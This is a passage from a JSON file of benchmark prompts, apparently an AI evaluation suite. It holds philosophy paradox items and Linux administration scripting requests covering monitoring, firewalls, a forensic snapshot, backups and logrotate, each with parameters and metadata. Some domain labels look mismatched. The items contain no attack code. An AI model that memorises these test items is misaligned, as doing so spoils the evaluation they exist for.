        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_38",
      "name": "Test 38: The Paradox of Perfect Prediction",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive prediction systems interact in ways that create paradoxes about free will, determinism, and prediction:\n\nSystem 1: The Oracle\nPredicts what will happen with 100% accuracy, including its own predictions.\n\nSystem 2: The Contrarian\nAlways does the opposite of what's predicted.\n\nSystem 3: The Conditional\nMakes predictions of the form \"X will happen if this prediction is not revealed.\"\n\nSystem 4: The Recursive\nPredicts what would happen if its prediction is believed.\n\nSystem 5: The Meta-Predictor\nPredicts which predictions will be self-fulfilling or self-defeating.\n\nThe Scenario:\nAll five systems must predict the same event: \"Will the mayor resign tomorrow?\"\n\nThe Predictions:\n- Oracle: \"The mayor will resign if and only if this prediction causes them not to\"\n- Contrarian: \"The opposite of what I predict will happen\"\n- Conditional: \"The mayor will resign if this prediction remains secret\"\n- Recursive: \"The mayor will resign, causing them not to because they'll feel manipulated\"\n- Meta-Predictor: \"All predictions except mine will be self-defeating\"\n\nThe Paradoxes:\n\n1. Oracle Paradox: If the Oracle is always right, but its prediction is paradoxical, what happens?\n\n2. Contrarian Paradox: Predicting \"the opposite of what I predict\" creates infinite regress.\n\n3. Conditional Paradox: Once stated, the condition is violated, but that might make it true.\n\n4. Recursive Paradox: Creates causal loops where belief causes reality causes belief.\n\n5. Meta-Paradox: If the Meta-Predictor is right, its own prediction affects the others.\n\nThe Mayor's Dilemma:\nThe mayor knows all five predictions and must decide whether to resign. Any decision seems to violate at least one prediction, but the Oracle is never wrong.\n\nQuestions:\n1. Can perfect prediction coexist with free will?\n2. Which predictions are logically possible?\n3. How should the mayor decide given these predictions?\n4. Can a prediction include its own effect on outcomes?\n5. Is there a decision that satisfies all non-paradoxical predictions?\n6. What does this say about the nature of prediction and determinism?\n\nExplore whether perfect prediction is logically possible and how predictions interact with the events they predict.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive prediction systems interact in ways that create paradoxes about free will, determinism, and prediction:\n\nSystem 1: The Oracle\nPredicts what will happen with 100% accuracy, including its own predictions.\n\nSystem 2: The Contrarian\nAlways does the opposite of what's predicted.\n\nSystem 3: The Conditional\nMakes predictions of the form \"X will happen if this prediction is not revealed.\"\n\nSystem 4: The Recursive\nPredicts what would happen if its prediction is believed.\n\nSystem 5: The Meta-Predictor\nPredicts which predictions will be self-fulfilling or self-defeating.\n\nThe Scenario:\nAll five systems must predict the same event: \"Will the mayor resign tomorrow?\"\n\nThe Predictions:\n- Oracle: \"The mayor will resign if and only if this prediction causes them not to\"\n- Contrarian: \"The opposite of what I predict will happen\"\n- Conditional: \"The mayor will resign if this prediction remains secret\"\n- Recursive: \"The mayor will resign, causing them not to because they'll feel manipulated\"\n- Meta-Predictor: \"All predictions except mine will be self-defeating\"\n\nThe Paradoxes:\n\n1. Oracle Paradox: If the Oracle is always right, but its prediction is paradoxical, what happens?\n\n2. Contrarian Paradox: Predicting \"the opposite of what I predict\" creates infinite regress.\n\n3. Conditional Paradox: Once stated, the condition is violated, but that might make it true.\n\n4. Recursive Paradox: Creates causal loops where belief causes reality causes belief.\n\n5. Meta-Paradox: If the Meta-Predictor is right, its own prediction affects the others.\n\nThe Mayor's Dilemma:\nThe mayor knows all five predictions and must decide whether to resign. Any decision seems to violate at least one prediction, but the Oracle is never wrong.\n\nQuestions:\n1. Can perfect prediction coexist with free will?\n2. Which predictions are logically possible?\n3. How should the mayor decide given these predictions?\n4. Can a prediction include its own effect on outcomes?\n5. Is there a decision that satisfies all non-paradoxical predictions?\n6. What does this say about the nature of prediction and determinism?\n\nExplore whether perfect prediction is logically possible and how predictions interact with the events they predict.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_39",
      "name": "Test 39: The Identity Paradox Network",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive people undergo procedures that create interconnected identity paradoxes:\n\nPerson A: Brain Split\nA's brain is split; each half is put in a new body. Both claim to be A.\n\nPerson B: Gradual Replacement\nB's neurons are gradually replaced with artificial ones over 10 years. At what point do they stop being B?\n\nPerson C: Teleportation\nC is disintegrated and reconstructed elsewhere. Did C die and get replaced by a copy, or did C travel?\n\nPerson D: Memory Swap\nD's memories are exchanged with E's. Is the person with D's body but E's memories D or E?\n\nPerson E: Consciousness Merge\nE's consciousness is merged with all others. Is E now everyone, no one, or still E?\n\nThe Identity Claims:\n- Both versions of A claim continuity with original A\n- B claims continuous identity despite complete replacement\n- Teleported C claims to be the same person\n- Body-D claims to be E, Body-E claims to be D\n- Merged E claims to be all five people simultaneously\n\nThe Paradoxes:\n\n1. Transitivity Failure: If A1=A and A2=A, then A1=A2, but they're different people.\n\n2. Ship of Theseus: B is the same person with no original parts.\n\n3. Continuity Gap: C experienced either death or instantaneous travel.\n\n4. Identity Swap: D and E have switched identities, or have they?\n\n5. One Becomes Many: E is now five people, but five people can't be one.\n\nLegal and Ethical Dilemmas:\n- Who inherits A's property?\n- Is B responsible for crimes committed before replacement?\n- Can teleported C be tried for pre-teleportation crimes?\n- Whose marriage is valid - body-D's or memory-D's?\n- Does merged E have five votes or one?\n\nQuestions:\n1. What constitutes personal identity - body, brain, memories, or continuity?\n2. Can identity branch, merge, or transfer?\n3. How do these paradoxes interact when considered together?\n4. Is there a consistent theory of identity that resolves all five cases?\n5. Should legal identity track philosophical identity?\n6. What do these cases reveal about the nature of consciousness and self?\n\nAnalyze competing theories of personal identity and whether any can handle all five paradoxes consistently.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive people undergo procedures that create interconnected identity paradoxes:\n\nPerson A: Brain Split\nA's brain is split; each half is put in a new body. Both claim to be A.\n\nPerson B: Gradual Replacement\nB's neurons are gradually replaced with artificial ones over 10 years. At what point do they stop being B?\n\nPerson C: Teleportation\nC is disintegrated and reconstructed elsewhere. Did C die and get replaced by a copy, or did C travel?\n\nPerson D: Memory Swap\nD's memories are exchanged with E's. Is the person with D's body but E's memories D or E?\n\nPerson E: Consciousness Merge\nE's consciousness is merged with all others. Is E now everyone, no one, or still E?\n\nThe Identity Claims:\n- Both versions of A claim continuity with original A\n- B claims continuous identity despite complete replacement\n- Teleported C claims to be the same person\n- Body-D claims to be E, Body-E claims to be D\n- Merged E claims to be all five people simultaneously\n\nThe Paradoxes:\n\n1. Transitivity Failure: If A1=A and A2=A, then A1=A2, but they're different people.\n\n2. Ship of Theseus: B is the same person with no original parts.\n\n3. Continuity Gap: C experienced either death or instantaneous travel.\n\n4. Identity Swap: D and E have switched identities, or have they?\n\n5. One Becomes Many: E is now five people, but five people can't be one.\n\nLegal and Ethical Dilemmas:\n- Who inherits A's property?\n- Is B responsible for crimes committed before replacement?\n- Can teleported C be tried for pre-teleportation crimes?\n- Whose marriage is valid - body-D's or memory-D's?\n- Does merged E have five votes or one?\n\nQuestions:\n1. What constitutes personal identity - body, brain, memories, or continuity?\n2. Can identity branch, merge, or transfer?\n3. How do these paradoxes interact when considered together?\n4. Is there a consistent theory of identity that resolves all five cases?\n5. Should legal identity track philosophical identity?\n6. What do these cases reveal about the nature of consciousness and self?\n\nAnalyze competing theories of personal identity and whether any can handle all five paradoxes consistently.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_40",
      "name": "Test 40: The Paradox of Emergent Properties",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive systems exhibit emergent properties that seem to violate the principle that wholes cannot exceed their parts:\n\nSystem 1: The Conscious Network\nIndividual neurons aren't conscious, but their network is. Where does consciousness come from?\n\nSystem 2: The Intelligent Swarm\nIndividual ants follow simple rules, but the colony solves complex problems no ant understands.\n\nSystem 3: The Living Organization\nA corporation acts with intent and purpose, though it's just people and paper. Is it alive?\n\nSystem 4: The Quantum Computer\nQubits individually hold one bit, but together compute impossible problems. Where's the extra computation?\n\nSystem 5: The Cultural Evolution\nMemes evolve and spread with no individual understanding or controlling them. What is evolving?\n\nThe Paradoxes:\n\n1. Consciousness: How can non-conscious parts create consciousness? The whole seems qualitatively different from parts.\n\n2. Intelligence: The colony knows things no ant knows. Where is this knowledge stored?\n\n3. Agency: The corporation makes decisions no individual made. Who or what decided?\n\n4. Computation: Quantum computers seem to compute more than their parts should allow.\n\n5. Evolution: Cultural evolution has no genes or organisms. What is the unit of selection?\n\nThe Reductionist Challenge:\n\"All properties must be present in parts or their interactions. Emergent properties that aren't reducible to parts violate physics.\"\n\nThe Emergentist Response:\n\"Wholes have properties that parts lack. Emergence is real and irreducible. The whole is more than the sum.\"\n\nTest Cases:\n- Removing one neuron doesn't eliminate consciousness\n- Removing one ant doesn't eliminate colony intelligence\n- Removing one employee doesn't kill the corporation\n- Removing one qubit might destroy quantum advantage\n- Removing one person doesn't stop cultural evolution\n\nQuestions:\n1. Are emergent properties real or just descriptions?\n2. Can something truly be more than the sum of its parts?\n3. Where do emergent properties exist - in parts, relations, or somewhere else?\n4. How do you predict which systems will have emergence?\n5. Is consciousness special, or just another emergent property?\n6. Do these paradoxes challenge reductionism or support it?\n\nExamine whether emergence represents a genuine paradox or reveals limits in our understanding of complex systems.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive systems exhibit emergent properties that seem to violate the principle that wholes cannot exceed their parts:\n\nSystem 1: The Conscious Network\nIndividual neurons aren't conscious, but their network is. Where does consciousness come from?\n\nSystem 2: The Intelligent Swarm\nIndividual ants follow simple rules, but the colony solves complex problems no ant understands.\n\nSystem 3: The Living Organization\nA corporation acts with intent and purpose, though it's just people and paper. Is it alive?\n\nSystem 4: The Quantum Computer\nQubits individually hold one bit, but together compute impossible problems. Where's the extra computation?\n\nSystem 5: The Cultural Evolution\nMemes evolve and spread with no individual understanding or controlling them. What is evolving?\n\nThe Paradoxes:\n\n1. Consciousness: How can non-conscious parts create consciousness? The whole seems qualitatively different from parts.\n\n2. Intelligence: The colony knows things no ant knows. Where is this knowledge stored?\n\n3. Agency: The corporation makes decisions no individual made. Who or what decided?\n\n4. Computation: Quantum computers seem to compute more than their parts should allow.\n\n5. Evolution: Cultural evolution has no genes or organisms. What is the unit of selection?\n\nThe Reductionist Challenge:\n\"All properties must be present in parts or their interactions. Emergent properties that aren't reducible to parts violate physics.\"\n\nThe Emergentist Response:\n\"Wholes have properties that parts lack. Emergence is real and irreducible. The whole is more than the sum.\"\n\nTest Cases:\n- Removing one neuron doesn't eliminate consciousness\n- Removing one ant doesn't eliminate colony intelligence\n- Removing one employee doesn't kill the corporation\n- Removing one qubit might destroy quantum advantage\n- Removing one person doesn't stop cultural evolution\n\nQuestions:\n1. Are emergent properties real or just descriptions?\n2. Can something truly be more than the sum of its parts?\n3. Where do emergent properties exist - in parts, relations, or somewhere else?\n4. How do you predict which systems will have emergence?\n5. Is consciousness special, or just another emergent property?\n6. Do these paradoxes challenge reductionism or support it?\n\nExamine whether emergence represents a genuine paradox or reveals limits in our understanding of complex systems.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "linux_test_01",
      "name": "Test 1: Proactive Resource Monitor",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nWrite a Python script that:\n1. Uses `psutil` to find processes consuming >1GB RAM or >50% CPU for more than 60 seconds.\n2. For each such process, gracefully sends a SIGTERM signal.\n3. If the process does not terminate within 10 seconds, forcefully sends a SIGKILL signal.\n4. Logs every action (detection, SIGTERM, SIGKILL) with PID, process name, and resource usage metrics to a JSON log file at `/var/log/resource_monitor.json`.\n5. The script should run as a continuous daemon.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script that:\n1. Uses `psutil` to find processes consuming >1GB RAM or >50% CPU for more than 60 seconds.\n2. For each such process, gracefully sends a SIGTERM signal.\n3. If the process does not terminate within 10 seconds, forcefully sends a SIGKILL signal.\n4. Logs every action (detection, SIGTERM, SIGKILL) with PID, process name, and resource usage metrics to a JSON log file at `/var/log/resource_monitor.json`.\n5. The script should run as a continuous daemon.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_02",
      "name": "Test 2: High-Availability Container Stack",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nCreate a docker-compose.yml for a high-availability web service:\n- Use Traefik as a reverse proxy that load balances two instances of a Python backend app.\n- Traefik must handle automatic SSL certificate generation via Let's Encrypt for `app.example.com`.\n- Include a PostgreSQL database with a persistent named volume for data.\n- Include a Redis cache for session storage.\n- Define strict resource limits (CPU/memory) and healthchecks for all services.\n- Use Docker secrets to manage the database password.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a docker-compose.yml for a high-availability web service:\n- Use Traefik as a reverse proxy that load balances two instances of a Python backend app.\n- Traefik must handle automatic SSL certificate generation via Let's Encrypt for `app.example.com`.\n- Include a PostgreSQL database with a persistent named volume for data.\n- Include a Redis cache for session storage.\n- Define strict resource limits (CPU/memory) and healthchecks for all services.\n- Use Docker secrets to manage the database password.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_03",
      "name": "Test 3: Advanced Firewall with IPSet",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nWrite a bash script to configure iptables using ipset for dynamic blocking:\n1. Create an ipset hash named `dynamic_blacklist`.\n2. Add an iptables rule to the INPUT chain to drop all traffic from IPs in the `dynamic_blacklist` set.\n3. Create a second rule that logs and then adds the source IP to `dynamic_blacklist` if it attempts to connect to port 23 (telnet).\n4. Add rules to allow SSH from a trusted network (10.0.0.0/8) and established connections.\n5. Ensure the rules and the ipset persist across reboots.\nInclude comments for each step.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a bash script to configure iptables using ipset for dynamic blocking:\n1. Create an ipset hash named `dynamic_blacklist`.\n2. Add an iptables rule to the INPUT chain to drop all traffic from IPs in the `dynamic_blacklist` set.\n3. Create a second rule that logs and then adds the source IP to `dynamic_blacklist` if it attempts to connect to port 23 (telnet).\n4. Add rules to allow SSH from a trusted network (10.0.0.0/8) and established connections.\n5. Ensure the rules and the ipset persist across reboots.\nInclude comments for each step.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_04",
      "name": "Test 4: Correlated Health Monitor",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nCreate a bash script that checks system health by correlating metrics:\n- If CPU usage is >80% for 3 consecutive checks (10s apart), get the top 3 CPU-consuming PIDs and their command lines.\n- If available memory is <500MB, check for kernel OOM killer messages in dmesg from the last hour.\n- If disk usage on `/` is >85%, list the 10 largest directories within `/var/log`.\n- If the 1-minute load average exceeds the number of CPU cores, log a critical warning with the current load and core count.\nOutput should be in a structured log format: \"TIMESTAMP LEVEL [CHECK_NAME] Details...\"\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a bash script that checks system health by correlating metrics:\n- If CPU usage is >80% for 3 consecutive checks (10s apart), get the top 3 CPU-consuming PIDs and their command lines.\n- If available memory is <500MB, check for kernel OOM killer messages in dmesg from the last hour.\n- If disk usage on `/` is >85%, list the 10 largest directories within `/var/log`.\n- If the 1-minute load average exceeds the number of CPU cores, log a critical warning with the current load and core count.\nOutput should be in a structured log format: \"TIMESTAMP LEVEL [CHECK_NAME] Details...\"\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_05",
      "name": "Test 5: Forensic Security Snapshot",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nWrite a script that creates a forensic snapshot of the current system state:\n1. Find all SUID/SGID binaries modified in the last 7 days.\n2. List all active listening ports and the PIDs/names of the services using them.\n3. Dump the command history for all currently logged-in users.\n4. Hash the contents of `/etc/passwd` and `/etc/shadow` and store the hashes.\n5. Package all findings into a single compressed tarball named `snapshot-HOSTNAME-YYYYMMDD.tar.gz`.\nReport findings to stdout and write the detailed files into the tarball.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script that creates a forensic snapshot of the current system state:\n1. Find all SUID/SGID binaries modified in the last 7 days.\n2. List all active listening ports and the PIDs/names of the services using them.\n3. Dump the command history for all currently logged-in users.\n4. Hash the contents of `/etc/passwd` and `/etc/shadow` and store the hashes.\n5. Package all findings into a single compressed tarball named `snapshot-HOSTNAME-YYYYMMDD.tar.gz`.\nReport findings to stdout and write the detailed files into the tarball.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_06",
      "name": "Test 6: Idempotent Database Backup & Restore",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nCreate a robust PostgreSQL management script that can be run with `backup` or `restore` arguments:\n- `backup`: Dumps the 'production' database, encrypts the dump using GPG with a public key (`backup_key.pub`), and uploads it to an S3 bucket. The filename should be `backup-YYYYMMDD-HHMMSS.sql.gz.gpg`.\n- `restore`: Lists available backups from the S3 bucket, prompts the user to choose one, downloads it, decrypts it with a GPG private key, and restores it to a new database named `production_restored_TIMESTAMP`.\n- Both operations must be logged extensively.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a robust PostgreSQL management script that can be run with `backup` or `restore` arguments:\n- `backup`: Dumps the 'production' database, encrypts the dump using GPG with a public key (`backup_key.pub`), and uploads it to an S3 bucket. The filename should be `backup-YYYYMMDD-HHMMSS.sql.gz.gpg`.\n- `restore`: Lists available backups from the S3 bucket, prompts the user to choose one, downloads it, decrypts it with a GPG private key, and restores it to a new database named `production_restored_TIMESTAMP`.\n- Both operations must be logged extensively.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_07",
      "name": "Test 7: Stateful Service Manager",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a Python script using `systemd-python` that manages a set of services (`nginx`, `mysql`, `redis`):\n1. Checks the state of each service.\n2. If a service is 'failed', it should first try to restart it.\n3. If it enters the 'failed' state again within 5 minutes, the script should not restart it again and instead send an alert (print to stderr).\n4. If a service depends on another (e.g., app depends on mysql), it should ensure the dependency is active before starting the service.\n5. Log all state changes and actions in a structured format.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script using `systemd-python` that manages a set of services (`nginx`, `mysql`, `redis`):\n1. Checks the state of each service.\n2. If a service is 'failed', it should first try to restart it.\n3. If it enters the 'failed' state again within 5 minutes, the script should not restart it again and instead send an alert (print to stderr).\n4. If a service depends on another (e.g., app depends on mysql), it should ensure the dependency is active before starting the service.\n5. Log all state changes and actions in a structured format.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_08",
      "name": "Test 8: Advanced Network Path Diagnostics",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nCreate a network diagnostic script that:\n1. Takes a domain name as an argument (e.g., 'google.com').\n2. Performs a DNS lookup for A, AAAA, and MX records.\n3. Uses `mtr` or `traceroute` to map the network path to the resolved A record IP.\n4. For each hop in the path, it attempts to measure latency.\n5. Checks if key ports (80, 443) are open on the final destination.\n6. Formats the final output as a JSON object containing DNS results, the full path trace with latencies, and port status.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a network diagnostic script that:\n1. Takes a domain name as an argument (e.g., 'google.com').\n2. Performs a DNS lookup for A, AAAA, and MX records.\n3. Uses `mtr` or `traceroute` to map the network path to the resolved A record IP.\n4. For each hop in the path, it attempts to measure latency.\n5. Checks if key ports (80, 443) are open on the final destination.\n6. Formats the final output as a JSON object containing DNS results, the full path trace with latencies, and port status.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_09",
      "name": "Test 9: Dynamic Log Rotation and Archiving",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a logrotate configuration for `/var/log/myapp/*.log` that:\n- Rotates when the file size exceeds 50MB or daily, whichever comes first.\n- Keeps 7 rotated logs locally, compressed.\n- Has a `postrotate` script that reloads the app.\n- Includes a `lastaction` script that runs after the rotation is complete to securely archive logs older than 7 days to a remote server using `rsync` over SSH.\n- The user/group for new logs should be `myapp:myapp`.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a logrotate configuration for `/var/log/myapp/*.log` that:\n- Rotates when the file size exceeds 50MB or daily, whichever comes first.\n- Keeps 7 rotated logs locally, compressed.\n- Has a `postrotate` script that reloads the app.\n- Includes a `lastaction` script that runs after the rotation is complete to securely archive logs older than 7 days to a remote server using `rsync` over SSH.\n- The user/group for new logs should be `myapp:myapp`.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_10",
      "name": "Test 10: Systemd Service Monitor",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nInstead of a bash script, write a systemd service unit file (`myapp-monitor.service`) and a corresponding timer unit (`myapp-monitor.timer`) to monitor a process:\n1. The timer should trigger the service every 60 seconds.\n2. The service unit should execute a script that checks if the 'myapp' process is running.\n3. If not running, it should start `/usr/bin/myapp`.\n4. Configure the main `myapp.service` to automatically restart on failure, but with a rate limit (`StartLimitBurst`) to prevent a restart loop. The monitor's job is to be a secondary check.\n5. Explain how to enable and start the timer.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nInstead of a bash script, write a systemd service unit file (`myapp-monitor.service`) and a corresponding timer unit (`myapp-monitor.timer`) to monitor a process:\n1. The timer should trigger the service every 60 seconds.\n2. The service unit should execute a script that checks if the 'myapp' process is running.\n3. If not running, it should start `/usr/bin/myapp`.\n4. Configure the main `myapp.service` to automatically restart on failure, but with a rate limit (`StartLimitBurst`) to prevent a restart loop. The monitor's job is to be a secondary check.\n5. Explain how to enable and start the timer.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_11",
      "name": "Test 11: Cryptographic Backup Verification",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "verification",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nCreate a script that verifies the integrity of the latest backup in `/backup/`:\n1. The backup directory contains data archives (`.tar.gz`) and a corresponding SHA256 checksum file (`.sha256`).\n2. The script must find the latest archive and its checksum file.\n3. It must recalculate the SHA256 hash of the archive and verify it against the contents of the checksum file.\n4. If the hash matches, it should then extract the archive to a temporary location.\n5. It then checks if a critical file, `/__CONFIG_VARS__`, exists within the extracted archive.\n6. Reports success or failure and cleans up the temporary files.\n",
      "messages": [
        {
          "role": "user",
